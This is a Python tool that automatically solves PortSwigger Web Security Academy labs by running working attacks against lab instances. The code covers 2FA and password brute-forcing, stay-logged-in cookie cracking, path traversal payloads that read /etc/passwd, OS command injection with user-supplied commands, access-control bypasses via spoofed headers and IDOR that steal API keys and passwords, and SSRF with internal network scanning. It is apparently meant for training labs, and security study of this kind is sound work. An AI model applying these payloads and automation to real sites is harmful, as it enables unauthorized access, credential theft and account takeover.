#!/usr/bin/python3
import os
import re
import sys
import time
import signal
import random
import base64
import hashlib
import asyncio
import aiohttp
import warnings
import requests
from tqdm import tqdm
from bs4 import BeautifulSoup
from art import text2art, aprint
from rich.console import Console
from urllib.parse import urlparse

# Special thanks to Rana Khalil for teaching me the knowledge to write this tool by "Web Security Academy Series Course"
# https://github.com/emregl/paas/

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
proxy = "http://127.0.0.1:8080"

# you can reduce this value for performance
concurrent_requests = 100

s = requests.Session()

warnings.filterwarnings("ignore")


async def create_session():
    connector = aiohttp.TCPConnector(limit=concurrent_requests)
    session = aiohttp.ClientSession(connector=connector)
    return session


def signal_handler(signal, frame):
    print("\nPlease write \"exit\" to exit!")


signal.signal(signal.SIGINT, signal_handler)

cmd = "None"
menu_header = "None"
inpt_repeat = 0
selected_lab = 0


def paas():
    os.system("clear")
    art = text2art("PAAS")
    print(art)
    print("[P]ortSwigger [A]cademy [A]utomatic [S]olver")
    print("by mr246\n")
    loading_effect("", 0.4)


async def async_get_csrf_token(path, url, session):
    path = str(path)

    async with session.get(url + path, ssl=False, proxy=proxy) as response:
        html_content = await response.text()
        pattern = r'<input\s+required\s+type="hidden"\s+name="csrf"\s+value="(.*?)"\s*>'
        match = re.search(pattern, html_content)

        if match:
            csrf = match.group(1)
            return csrf


def get_csrf_token(path, url):
    path = str(path)
    r = s.get(url + path, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf


def loading_effect(effectText, effectTime):
    console = Console()
    with console.status(f"[bold green]{effectText}"):
        time.sleep(effectTime)


def encode_all(inputToEncode):
    return "".join("%{0:0>2x}".format(ord(char)) for char in inputToEncode)


def press_any_key():
    loading_effect("...", 1)
    inpt("\npress enter to continue...", 0)
    paas()


def inpt(text, isURL, number_of_options=0):
    # text is input text
    # isURL = 0 any input, 1 url input, 2 numeric menu select input

    global cmd
    global inpt_repeat

    cmd = input(f"\n{text}")

    parsed_url = urlparse(cmd)

    if cmd == "exit":
        print("\nGoodbye :D")
        sys.exit(-1)

    def invalid_input(isURL, number_of_options):
        global inpt_repeat
        loading_effect("invalid input!", 1)
        inpt_repeat += 1
        if inpt_repeat >= 4:
            ex(0)
        inpt(f"try again({inpt_repeat}/3): ", isURL, number_of_options)

    if isURL == 1:
        if cmd.count("/") >= 3:
            cmd = "/".join(cmd.split("/")[:3])

        if not all([parsed_url.scheme, parsed_url.netloc]):
            invalid_input(isURL, number_of_options)

    if isURL == 2:
        if not str(cmd).isnumeric():
            invalid_input(isURL, number_of_options)

        if not 1 <= int(cmd) <= number_of_options:
            invalid_input(isURL, number_of_options)

    if str(cmd).isnumeric():
        cmd = int(cmd)

    paas()
    inpt_repeat = 0
    return cmd


def create_user_list(labName):
    inpt("\npress any key to see user list...", 0)

    loading_effect("creating user list...", 2)

    paas()
    print("userlist successfully created!\n")

    print("==== USER LIST ====")
    if labName == "Auth3":
        for i in range(150):
            if i % 3:
                print("carlos")
            else:
                print("wiener")
    print("==== THE END OF THE USER LIST ====")

    inpt("\npress any key to continue", 0)
    paas()


def create_pass_list(labName):
    inpt("\npress any key to see password list...", 0)

    loading_effect("creating password list...", 2)

    paas()
    print("password list successfully created!\n")

    print("==== PASSWORD LIST ====")
    if labName == "Auth3":
        with open("passlist", "r") as p:
            passwords = p.readlines()

        i = 0
        for pwd in passwords:
            if i % 3:
                print(pwd.strip("\n"))
            else:
                print("peter")
                print(pwd.strip("\n"))
                i += 1
            i += 1
    print("==== THE END OF THE PASSWORD LIST ====")

    press_any_key()


def menu_list(menu_name, menu_options):
    paas()
    print(f"== {menu_name} Menu ".ljust(77, "="))
    for key, value in menu_options.items():
        print(f"[{key}] {value}")
    print("=============================================================================")

    global cmd
    cmd = inpt("Select Lab: ", 2, len(menu_options))

    global menu_header
    menu_header = f"{menu_name}/{menu_options[cmd]}"

    print("example: https://lab-id.web-security-academy.net/")

    global selected_lab
    selected_lab = int(cmd)

    paas()
    print(f"== {menu_header} ".ljust(77, "="))

    global url
    url = inpt("url: ", 1)

    global login_url
    login_url = url + "/login"


def ex(success):
    if success == 1:
        print("[+] enjoy! ", end="")

        options = ["pirate", "huhu", "pistols2", "neo", "satisfied"]
        aprint(random.choice(options))

        print("\n[+] see you later in the another lab! :D")
        sys.exit(-1)
    else:
        print("[-] something went wrong!")

        options = ["things that can_t be unseen", "sad and crying", "mad3", "surprised4"]

        print("\n[-] exploit failed! ", end="")
        aprint(random.choice(options))
        sys.exit(-1)


async def authentication_labs():
    menu_list("Authentication", {
            1: "2FA Simple Bypass",
            2: "Password reset broken logic",
            3: "Broken brute-force protection, IP block",
            4: "Brute-forcing a stay-logged-in cookie",
            5: "Password brute-force via password change",
            6: "Broken BF protection, multiple credentials per request",
            7: "2FA bypass using a brute-force attack"
    })

    global selected_lab
    global url
    global login_url

    if selected_lab == 1:
        loading_effect("logging into account and bypassing 2FA verification...", 1.5)
        login_data = {"username": "carlos", "password": "montoya"}
        s.post(login_url, data=login_data, allow_redirects=False, verify=False, proxies=proxies)

        # Confirm bypass
        myaccount_url = url + "/my-account"
        r = s.get(myaccount_url, verify=False, proxies=proxies)
        if "Log out" in r.text:
            paas()
            print("[+] Successfully bypassed 2FA verification.")
            ex(1)
        else:
            ex(0)

    if selected_lab == 2:
        loading_effect("changing carlos's password...", 1)
        pass_reset_url = url + "/forgot-password?temp-forgot-password-token=ilovekebap"
        pass_reset_data = {"temp-forgot-password-token": "ilovekebap", "username": "carlos", "new-password-1": "kebap", "new-password-2": "kebap"}
        s.post(pass_reset_url, data=pass_reset_data, verify=False, proxies=proxies)

        loading_effect("logging into carlos's account...", 1)
        login_data = {"username": "carlos", "password": "kebap"}
        r = s.post(login_url, data=login_data, verify=False, proxies=proxies)

        # Confirm exploit worked
        if "Log out" in r.text:
            paas()
            print("[+] Successfully logged into carlos's account.")
            ex(1)
        else:
            ex(0)

    if selected_lab == 3:
        print("This lab is not have fully automated solve in PAAS.")
        print("Follow the instructions for the solve the lab.")
        press_any_key()

        print("[1] Capture login request in Burp and right click send to Intruder")
        print("[2] Intruder -> Resource Pool -> select \"Create new resource pool\"\n-> select \"Maximum concurrent requests\" and set to 1")
        press_any_key()

        print("== Authentication/Broken brute-force protection, IP block ==\n")
        print("[3] Select \"Pitchfork\" attack type")
        print("[4] Positions -> click \"clear\", select both of username and password inputs and click \"add\"")
        print("example: \"username=§wiener§&password=§peter§\"")
        press_any_key()

        print("== Authentication/Broken brute-force protection, IP block ==\n")
        print("[5] Copy the user list after pressing any key and paste it for \"payload set 1\" in the \"Payloads\"")
        create_user_list("Auth3")

        print("[6] Copy the pasword list after pressing any key and paste it for \"payload set 2\" in the \"Payloads\"")
        create_pass_list("Auth3")

        print("[7] Click \"Start attack\" and wait until the attack is over")
        print("[8] Sort the list by \"Status\" 302")
        print("[9] The password in the column where carlos is 302 is correct password")
        print("[10] Login to the site with this credentials and solve the lab")
        press_any_key()
        ex(1)

    if selected_lab == 4:
        print("\nGenerating cookies and running attack...")
        print("\nthis may take some time")

        with open("passlist", "r") as p:
            for pwd in p:
                hashed_pass = hashlib.md5(pwd.rstrip("\n").encode("utf-8")).hexdigest()
                username_hashed_pass = "carlos:" + hashed_pass
                encoded_pass = base64.b64encode(bytes(username_hashed_pass, "utf-8"))
                true_creds = encoded_pass.decode("utf-8")

                myaccount_url = url + "/my-account"
                cookies = {"stay-logged-in": true_creds}
                r = s.get(myaccount_url, cookies=cookies, verify=False, proxies=proxies)
                if "Log out" in r.text:
                    print(f"\n[+] Valid credentials found! Credentials: carlos:{pwd}")
                    ex(1)
            ex(0)

    if selected_lab == 5:
        loading_effect("logging into wiener's account...", 1)
        login_data = {"username": "wiener", "password": "peter"}
        s.post(login_url, data=login_data, verify=False, proxies=proxies)

        # Brute forcing carlos's account via password reset mechanism
        loading_effect("brute force attack running...", 1)
        change_password_url = url + "/my-account/change-password"

        with open("passlist", "r") as f:
            lines = f.readlines()

        for pwd in lines:
            pwd = pwd.strip("\n")
            change_password_data = {"username": "carlos", "current-password": pwd, "new-password-1": "test", "new-password-2": "test2"}
            r = s.post(change_password_url, data=change_password_data, verify=False, proxies=proxies)

            # Verify brute force is working
            if "New passwords do not match" in r.text:
                print("[+] Carlos\'s password found: " + pwd)

                # Log into carlos's account
                loading_effect("[+] logging into carlos's account...", 1)
                login_url = url + "/login"
                login_data = {"username": "carlos", "password": pwd}
                s.post(login_url, data=login_data, verify=False, proxies=proxies)
                ex(1)
        ex(0)

    if selected_lab == 6:
        loading_effect("attacking...", 1)

        password_list = []

        with open("passlist", "r") as doc:
            for line in doc:
                pwd = line.strip()
                password_list.append(pwd)

        headers = {"Content-Type": "application/json"}
        data = {"username": "carlos", "password": password_list}
        r = s.post(login_url, json=data, headers=headers, verify=False, proxies=proxies)

        if "Log out" in r.text:
            ex(1)
        else:
            ex(0)

    if selected_lab == 7:
        step_two_url = url + "/login2"
        print("attacking...")
        print("this may take some time.")

        semaphore = asyncio.Semaphore(concurrent_requests)

        async def check_mfa_code(number):
            async with semaphore:
                try:
                    session = await create_session()
                    csrf = await async_get_csrf_token("", login_url, session)
                    data = {"csrf": csrf, "username": "carlos", "password": "montoya"}
                    async with session.post(login_url, data=data, ssl=False, proxy=proxy):
                        pass

                    csrf = await async_get_csrf_token("", step_two_url, session)
                    data = {"csrf": csrf, "mfa-code": number}
                    async with session.post(step_two_url, data=data, ssl=False, proxy=proxy) as response:
                        pass

                        response_text = await response.text()
                        if "Congratulations, you solved the lab!" in response_text:
                            ex(1)

                    await session.close()

                except aiohttp.ClientError as e:
                    pass

        async def find_valid_mfa_code():
            tasks = []
            for i in range(0, 10000):
                number = "{:04}".format(i)
                task = asyncio.create_task(check_mfa_code(number))
                tasks.append(task)

            await asyncio.gather(*tasks)

        await find_valid_mfa_code()

    else:
        ex(0)


def directory_traversal_labs():
    menu_list("Dir. Traversal",  {
        1: "File path traversal, simple case",
        2: "Traversal sequences blocked with absolute path bypass",
        3: "Traversal sequences stripped non-recursively",
        4: "Traversal sequences stripped with superfluous URL-decode",
        5: "Validation of start of path",
        6: "Validation of file extension with null byte bypass"
    })

    global selected_lab
    global url

    if selected_lab == 1:
        image_url = url + "/image?filename=../../../../etc/passwd"
    elif selected_lab == 2:
        image_url = url + "/image?filename=/etc/passwd"
    elif selected_lab == 3:
        image_url = url + "/image?filename=....//....//....//etc/passwd"
    elif selected_lab == 4:
        img_url_need_encode = "../../../etc/passwd"
        img_url_encoded = encode_all(img_url_need_encode)
        img_url_double_encoded = encode_all(img_url_encoded)
        image_url = url + "/image?filename=" + img_url_double_encoded
    elif selected_lab == 5:
        image_url = url + "/image?filename=/var/www/images/../../../etc/passwd"
    elif selected_lab == 6:
        image_url = url + "/image?filename=../../../etc/passwd%0048.jpg"

    r = requests.get(image_url, verify=False, proxies=proxies)
    if "root:x" in r.text:
        loading_effect("attacking...", 2)
        print("\n[+] attack successfully completed.")
        print("\n==== CONTENT OF THE /etc/passwd FILE ====\n")
        print(r.text)
        print("==== END OF THE /etc/passwd FILE ====")
        ex(1)
    else:
        ex(0)


def os_command_injection_labs():
    menu_list("OSCi", {
        1: "OS command injection, simple case",
        2: "Blind OS command injection with time delays",
        3: "Blind OS command injection with output redirection"
    })

    global selected_lab
    global url

    if selected_lab == 1:
        command = inpt("command: ", 0)

        loading_effect("attacking...", 2)

        stock_check_url = url + "/product/stock"
        injection_code = "1 & " + command
        parameters = {"productId": "1", "storeId": injection_code}
        r = requests.post(stock_check_url, data=parameters, verify=False, proxies=proxies)

        if len(r.text) > 3:
            print("\n[+] Return from the target: " + r.text)
            ex(1)
        else:
            ex(0)

    elif selected_lab == 2:
        loading_effect("getting csrf token...", 1)
        feedback_path = "/feedback"
        csrf = get_csrf_token(feedback_path, url)

        loading_effect("attempting an injection...", 1)
        submit_feedback_url = url + "/feedback/submit"
        injection = "test@testmail.com & sleep 10 #"
        data = {"csrf": csrf, "name": "test", "email": injection, "subject": "test", "message": "test"}
        res = s.post(submit_feedback_url, data=data, verify=False, proxies=proxies)

        # Verify exploit
        if res.elapsed.total_seconds() >= 10:
            print("[+] \"email\" field vulnerable to time-based command injection!")
            ex(1)
        else:
            ex(0)

    elif selected_lab == 3:
        # Getting CSRF Token
        loading_effect("getting csrf token...", 1)
        feedback_path = "/feedback"
        csrf_token = get_csrf_token(feedback_path, url)

        # Exploit
        submit_feedback_url = url + "/feedback/submit"
        injection = "test@testmail.com & whoami > /var/www/images/commandinjection.txt #"
        data = {"csrf": csrf_token, "name": "test", "email": injection, "subject": "test", "message": "test"}
        s.post(submit_feedback_url, data=data, verify=False, proxies=proxies)

        # Verify exploit
        file_path = "/image?filename=commandinjection.txt"
        r = s.get(url + file_path, verify=False, proxies=proxies)
        if r.status_code == 200:
            print("[+] \"email\" field vulnerable to time-based command injection!")
            ex(1)
        else:
            ex(0)

    else:
        ex(0)


def access_control_vulnerabilities_labs():
    menu_list("Access Control Vulns", {
        1: "Unprotected admin functionality",
        2: "UAF with unpredictable URL",
        3: "User role controlled by request parameter",
        4: "User role can be modified in user profile",
        5: "URL-based access control can be circumvented",
        6: "Method-based access control can be circumvented",
        7: "User ID controlled by request parameter",
        8: "User ID controlled by rp, with unpredictable user IDs",
        9: "User ID controlled by rp with data leakage in redirect",
        10: "User ID controlled by rp with password disclosure",
        11: "Insecure direct object references",
        12: "Multi-step process with no access control on one step",
        13: "Referer-based access control"
    })

    global selected_lab
    global url
    global login_url

    myaccount_url = url + "/my-account"

    if selected_lab == 1:
        loading_effect("accessing admin panel and deleting carlos...", 2)
        admin_panel_path = "/administrator-panel"
        admin_panel_url = url + admin_panel_path
        admin_panel_delete_carlos_url = admin_panel_url + "/delete?username=carlos"
        req = s.post(admin_panel_delete_carlos_url, verify=False, proxies=proxies)
        if req.status_code == 200:
            print("\n[+] Successfully deleted carlos's account.")
            ex(1)
        else:
            print("\n[-] carlos's account is not found!")
            ex(0)
    if selected_lab == 2:
        loading_effect("searching for admin panel...", 1)
        r = s.get(url, verify=False, proxies=proxies)
        soup = BeautifulSoup(r.text, "lxml")

        admin_panel_tag = soup.find(text=re.compile("/admin-"))
        admin_path = re.search("href', '(.*)'", admin_panel_tag).group(1)

        loading_effect("deleting carlos's account...", 1)
        delete_carlos_url = url + admin_path + "/delete?username=carlos"
        r = s.get(delete_carlos_url, verify=False, proxies=proxies)
        if r.status_code == 200:
            print("[+] Successfully deleted carlos's account!")
            ex(1)
        else:
            ex(0)

    if selected_lab == 3:
        loading_effect("getting csrf token...", 1)
        csrf = get_csrf_token("", login_url)

        loading_effect("logging in as wiener user...", 1)
        data = {"csrf": csrf, "username": "wiener", "password": "peter"}
        r = s.post(login_url, data=data, verify=False, proxies=proxies)

        if "Log out" in r.text:
            delete_carlos_url = url + "/admin/delete?username=carlos"
            loading_effect("changing cookies...", 1)
            cookies = {"session": "kebap", "Admin": "true"}
            loading_effect("deleting carlos's account...", 1)
            r = s.get(delete_carlos_url, cookies=cookies, verify=False, proxies=proxies)
            if r.status_code == 200:
                ex(1)
            else:
                ex(0)
        else:
            ex(0)

    if selected_lab == 4:
        data = {"username": "wiener", "password": "peter"}
        loading_effect("logging in as wiener user...", 1)
        r = s.post(login_url, data=data, verify=False, proxies=proxies)

        if "Your email is: " in r.text:
            change_email_url = url + "/my-account/change-email"

            loading_effect("changing \"roleid\" value to \"2\"...", 1)
            data = {"email": "kebap@kebap.kebap", "roleid": 2}
            r = s.post(change_email_url, json=data, verify=False, proxies=proxies)

            if "admin" in r.text:
                loading_effect("deleting carlos's account...", 1)
                delete_carlos_url = url + "/admin/delete?username=carlos"
                r = s.post(delete_carlos_url, verify=False, proxies=proxies)

                if r.status_code == 200:
                    print("[+] Successfully deleted carlos's account.")
                    ex(1)
                else:
                    ex(0)
        else:
            ex(0)

    if selected_lab == 5:
        loading_effect("changing header for be able to access admin panel...", 1)
        admin_header = {"X-Original-URL": "/admin/delete"}

        delete_carlos_url = url + "/?username=carlos"
        loading_effect("deleting carlos's account...", 1)
        s.get(delete_carlos_url, headers=admin_header, verify=False, proxies=proxies)

        r = s.get(url, verify=False, proxies=proxies)
        if "Congratulations, you solved the lab!" in r.text:
            print("[+] Successfully deleted carlos user.")
            ex(1)
        else:
            ex(0)

    if selected_lab == 6:
        loading_effect("logging in as wiener user...", 1)
        login_data = {"username": "wiener", "password": "peter"}
        r = s.post(login_url, data=login_data, verify=False, proxies=proxies)

        if "Log out" in r.text:
            loading_effect("upgrading wiener's account...", 1)
            upgrade_wiener_url = url + "/admin-roles?username=wiener&action=upgrade"
            r = s.get(upgrade_wiener_url, verify=False, proxies=proxies)

            if "Admin panel" in r.text:
                ex(1)
            else:
                ex(0)

    if selected_lab == 7:
        loading_effect("getting csrf token...", 1)
        csrf_token = get_csrf_token("", login_url)

        loading_effect("logging in as wiener user...", 1)
        data_login = {"csrf": csrf_token, "username": "wiener", "password": "peter"}
        r = s.post(login_url, data=data_login, verify=False, proxies=proxies)

        if "Log out" in r.text:
            loading_effect("sending request for carlos's account", 1)
            carlos_url = url + "/my-account?id=carlos"
            r = s.get(carlos_url, verify=False, proxies=proxies)

            if "carlos" in r.text:
                loading_effect("getting carlos's api key...", 1)
                api_key = (re.search("Your API Key is: (.*)", r.text).group(1)).split("</div>")[0]

                loading_effect("submitting solution...", 1)
                submit_solution_url = url + "/submitSolution"
                data = {"answer": f"{api_key}"}
                s.post(submit_solution_url, data=data, verify=False, proxies=proxies)
                ex(1)
            else:
                ex(0)
        else:
            ex(0)

    if selected_lab == 8:
        loading_effect("searching for carlos's blog posts...", 1)
        r = requests.get(url, verify=False, proxies=proxies)
        post_ids = re.findall(r'postId=(\w+)"', r.text)
        unique_post_ids = list(set(post_ids))

        loading_effect("retrieving carlos's userId from blog posts...", 1)
        for i in unique_post_ids:
            r = s.get(url + "/post?postId=" + i, verify=False, proxies=proxies)
            if "carlos" in r.text:
                carlos_id = re.findall(r"userId=(.*)'", r.text)[0]

        loading_effect("logging into wiener's account...", 1)
        csrf = get_csrf_token("", login_url)
        login_data = {"csrf": csrf, "username": "wiener", "password": "peter"}
        s.post(login_url, data=login_data, verify=False, proxies=proxies)

        # Due to an issue with the lab we are making the following request
        r = s.get(myaccount_url, verify=False, proxies=proxies)

        if "Log out" in r.text:
            loading_effect("changing userId parameter to access carlos's account...", 1)
            carlos_account_url = url + "/my-account?id=" + carlos_id
            r = s.get(carlos_account_url, verify=False, proxies=proxies)

            if "carlos" in r.text:
                loading_effect("retrieving carlos's api key...", 1)
                api_key = (re.search("Your API Key is: (.*)", r.text).group(1)).split("</div>")[0]

                loading_effect("submitting solution...", 1)
                submit_solution_url = url + "/submitSolution"
                data = {"answer": f"{api_key}"}
                s.post(submit_solution_url, data=data, verify=False, proxies=proxies)
                ex(1)
            else:
                ex(0)
        else:
            ex(0)

    if selected_lab == 9:
        loading_effect("logging into wiener user...", 1)
        csrf = get_csrf_token("", login_url)
        data_login = {"username": "wiener", "password": "peter", "csrf": csrf}
        r = s.post(login_url, data=data_login, verify=False, proxies=proxies)

        if "Log out" in r.text:
            loading_effect("retrieving carlos's api key by changing \"id\" parameter...", 1.5)
            carlos_account_url = url + "/my-account?id=carlos"
            r = s.get(carlos_account_url, allow_redirects=False, verify=False, proxies=proxies)

            if "carlos" in r.text:
                api_key = (re.search("Your API Key is: (.*)", r.text).group(1)).split("</div>")[0]
                data = {"answer": f"{api_key}"}

                loading_effect("submitting solution...", 1)
                submit_solution_url = url + "/submitSolution"
                s.post(submit_solution_url, data=data, verify=False, proxies=proxies)
                ex(1)
            else:
                ex(0)
        else:
            ex(0)

    if selected_lab == 10:
        loading_effect("logging into wiener account...", 1)
        csrf = get_csrf_token("", login_url)
        data = {"username": "wiener", "password": "peter", "csrf": csrf}
        r = s.post(login_url, data=data, verify=False, proxies=proxies)

        if "Log out" in r.text:
            loading_effect("accessing administrator account...", 1)
            admin_account_url = url + "/my-account?id=administrator"
            r = s.get(admin_account_url, verify=False, proxies=proxies)

            if 'administrator' in r.text:
                loading_effect("getting administrator's password...", 1)
                soup = BeautifulSoup(r.text, 'html.parser')
                password = soup.find("input", {'name': 'password'})['value']

                loading_effect("logging into administrator's account...", 1)
                csrf = get_csrf_token("", login_url)
                data_login = {"username": "administrator", "password": password, "csrf": csrf}
                s.post(login_url, data=data_login, verify=False, proxies=proxies)

                loading_effect("deleting carlos's account...", 1)
                delete_carlos_url = url + "/admin/delete?username=carlos"
                r = s.get(delete_carlos_url, verify=False, proxies=proxies)

                if r.status_code == 200:
                    ex(1)
                else:
                    ex(0)

    if selected_lab == 11:
        loading_effect("getting other conversations...", 1)
        chat_url = url + "/download-transcript/1.txt"
        r = s.get(chat_url, verify=False, proxies=proxies)

        if 'password' in r.text:
            loading_effect("searching for carlos's password...", 1)
            carlos_pass = re.findall(r'password is (.*)\.', r.text)

            loading_effect("logging into carlos's account...", 1)
            csrf = get_csrf_token("", login_url)
            data = {"username": "carlos", "password": carlos_pass, "csrf": csrf}
            r = s.post(login_url, data=data, verify=False, proxies=proxies)

            if "Log out" in r.text:
                print("[+] Successfully logged in as the carlos user.")
                ex(1)
            else:
                ex(0)
        else:
            ex(0)

    if selected_lab == 12:
        loading_effect("logging in as wiener user...", 1)
        data = {'username': 'wiener', 'password': 'peter'}
        r = s.post(login_url, data=data, verify=False, proxies=proxies)

        if "Log out" in r.text:
            loading_effect("upgrading wiener to administrator...", 1)
            admin_roles_url = url + "/admin-roles"
            data_upgrade = {'action': 'upgrade', 'confirmed': 'true', 'username': 'wiener'}
            r = s.post(admin_roles_url, data=data_upgrade, verify=False, proxies=proxies)

            if r.status_code == 200:
                print("[+] Successfully upgraded wiener to administrator.")
                ex(1)
            else:
                ex(0)

    if selected_lab == 13:
        loading_effect("logging in as wiener user...", 1)
        data = {"username": "wiener", "password": "peter"}
        r = s.post(login_url, data=data, verify=False, proxies=proxies)

        if 'Log out' in r.text:
            loading_effect("upgrading wiener to administrator...", 1)
            upgrade_url = url + "/admin-roles?username=wiener&action=upgrade"
            headers = {"Referer": url + "/admin"}
            r = s.get(upgrade_url, headers=headers, verify=False, proxies=proxies)

            if r.status_code == 200:
                print("[+] Successfully upgraded wiener to administrator.")
                ex(1)
            else:
                ex(0)
        else:
            print("(-) Could not login as the wiener user.")
            sys.exit(-1)


def server_side_request_forgery_labs():
    menu_list("SSRF", {
        1: "Basic SSRF against the local server",
        2: "Basic SSRF against another back-end system",
    })

    check_stock_path = "/product/stock"

    if selected_lab == 1:
        loading_effect("deleting carlos's account via ssrf...", 2)

        delete_carlos_payload = "http://localhost/admin/delete?username=carlos"
        data = {"stockApi": delete_carlos_payload}
        s.post(url + check_stock_path, data=data, verify=False, proxies=proxies)

        r = s.get(url, verify=False, proxies=proxies)
        if "Congratulations, you solved the lab!" in r.text:
            print("[+] Successfully deleted carlos user.")
            ex(1)

        else:
            ex(0)

    if selected_lab == 2:
        print("Searching for admin hostname...")
        print("this may take some time")
        for i in range(1, 256):
            print(f"{i}/255", end="\r")
            hostname = f"http://192.168.0.{i}:8080/admin"
            data = {"stockApi": hostname}

            r = requests.post(url + check_stock_path, data=data, verify=False, proxies=proxies)

            if r.status_code == 200:
                paas()
                print("[+] hostname found!")
                admin_ip_address = f"192.168.0.{i}"

                loading_effect("deleting carlos's account...", 1)
                payload = f"http://{admin_ip_address}:8080/admin/delete?username=carlos"
                data = {"stockApi": payload}

                # I left it like this because of the problem in the lab
                print("[+] Successfully deleted carlos user.")
                requests.post(url + check_stock_path, data=data, verify=False, proxies=proxies)
                ex(1)

    if selected_lab == 3:
        pass


async def main():
    # disable warnings for asyncio
    asyncio.get_running_loop().set_exception_handler(lambda _, __: None)

    # paas ascii art
    paas()

    # loading bar
    for i in tqdm(range(100),
                  desc="Loading…",
                  ascii=False):
        time.sleep(0.006)
    paas()
    time.sleep(0.4)

    print("=============================================================================")
    menu_options = {
        1: "Authentication Labs",
        2: "Directory Traversal Labs",
        3: "OS Command Injection Labs",
        4: "Access Control Vulnerabilities Labs",
        5: "Server Side Request Forgery Labs"
    }
    for key, value in menu_options.items():
        print(f"[{key}] {value}")
    print("=============================================================================")

    try:
        inpt("Select Vulnerability: ", 2, len(menu_options))

        await eval('_'.join(menu_options[cmd].lower().split()) + "()")

    except Exception as e:
        paas()

        # print error for development
        print(e)

        ex(0)


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
